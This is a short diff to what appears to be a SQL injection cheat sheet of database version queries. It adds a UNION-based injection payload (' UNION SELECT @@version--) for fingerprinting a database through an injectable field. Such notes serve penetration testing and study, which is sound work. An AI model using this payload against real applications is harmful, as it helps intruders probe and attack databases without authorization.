@@ -8,3 +8,6 @@ SELECT * FROM v$version
 
 --PostgreSQL --
 SELECT version() 
+
+--Use with UNION attack--
+' UNION SELECT @@version--
